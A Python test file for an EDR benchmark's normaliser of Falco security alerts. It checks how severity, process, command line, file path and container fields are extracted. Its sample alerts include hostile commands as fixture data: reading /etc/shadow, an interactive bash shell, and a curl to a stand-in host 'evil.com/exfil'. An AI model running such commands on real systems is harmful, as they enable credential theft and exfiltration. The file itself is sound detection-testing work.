"""Tests for FalcoNormalizer."""
from __future__ import annotations

import pytest

from edr_bench.edr_interface.falco_normalizer import FalcoNormalizer
from edr_bench.models.enums import Severity


SAMPLE_FALCO_ALERT = {
    "uuid": "abc-123-def",
    "output": "14:32:10.000000000: Warning Sensitive file opened for reading by non-trusted program (file=/etc/shadow proc.name=cat)",
    "priority": "Warning",
    "rule": "Read sensitive file untrusted",
    "time": "2024-07-12T14:32:10.000000000Z",
    "output_fields": {
        "container.id": "a1b2c3d4e5f6",
        "evt.time": 1720791130000000000,
        "fd.name": "/etc/shadow",
        "proc.cmdline": "cat /etc/shadow",
        "proc.name": "cat",
        "user.name": "root",
    },
    "source": "syscall",
    "tags": ["filesystem", "mitre_credential_access"],
}

SAMPLE_FALCO_CRITICAL = {
    "output": "Terminal shell in container (container_id=abc proc.name=bash)",
    "priority": "Emergency",
    "rule": "Terminal shell in container",
    "time": "2024-07-12T15:00:00.000Z",
    "output_fields": {
        "container.id": "xyz-789",
        "proc.name": "bash",
        "proc.cmdline": "bash -i",
    },
}

SAMPLE_FALCO_NETWORK = {
    "output": "Outbound connection to suspicious IP",
    "priority": "Error",
    "rule": "Unexpected outbound connection",
    "time": "2024-07-12T16:00:00.000Z",
    "output_fields": {
        "proc.name": "curl",
        "proc.cmdline": "curl https://evil.com/exfil",
        "fd.name": "203.0.113.50:443",
        "container.id": "c0ffee",
    },
}


@pytest.mark.unit
class TestFalcoNormalizer:
    def setup_method(self):
        self.normalizer = FalcoNormalizer()

    def test_rule_name_extracted(self):
        finding = self.normalizer.normalize_json(SAMPLE_FALCO_ALERT)
        assert finding.rule_name == "Read sensitive file untrusted"

    def test_severity_warning_mapped(self):
        finding = self.normalizer.normalize_json(SAMPLE_FALCO_ALERT)
        assert finding.severity == Severity.MEDIUM

    def test_severity_emergency_mapped(self):
        finding = self.normalizer.normalize_json(SAMPLE_FALCO_CRITICAL)
        assert finding.severity == Severity.CRITICAL

    def test_severity_error_mapped(self):
        finding = self.normalizer.normalize_json(SAMPLE_FALCO_NETWORK)
        assert finding.severity == Severity.HIGH

    def test_process_name_extracted(self):
        finding = self.normalizer.normalize_json(SAMPLE_FALCO_ALERT)
        assert finding.process_name == "cat"

    def test_command_line_extracted(self):
        finding = self.normalizer.normalize_json(SAMPLE_FALCO_ALERT)
        assert finding.command_line == "cat /etc/shadow"

    def test_file_path_extracted(self):
        finding = self.normalizer.normalize_json(SAMPLE_FALCO_ALERT)
        assert finding.file_path == "/etc/shadow"

    def test_container_id_extracted(self):
        finding = self.normalizer.normalize_json(SAMPLE_FALCO_ALERT)
        assert finding.source_container == "a1b2c3d4e5f6"

    def test_description_from_output(self):
        finding = self.normalizer.normalize_json(SAMPLE_FALCO_ALERT)
        assert "Sensitive file opened" in finding.description

    def test_timestamp_from_time_field(self):
        finding = self.normalizer.normalize_json(SAMPLE_FALCO_ALERT)
        assert finding.timestamp.year == 2024

    def test_output_fields_lifted(self):
        """Verify that output_fields dict is removed and its keys are at top level."""
        finding = self.normalizer.normalize_json(SAMPLE_FALCO_ALERT)
        # output_fields should not appear in raw (it was popped)
        assert "output_fields" not in finding.raw
        assert "proc.name" in finding.raw

    def test_alert_without_output_fields(self):
        """Normalizer should handle alerts missing output_fields gracefully."""
        alert = {"rule": "Test Rule", "priority": "Notice", "output": "test"}
        finding = self.normalizer.normalize_json(alert)
        assert finding.rule_name == "Test Rule"
        assert finding.severity == Severity.LOW
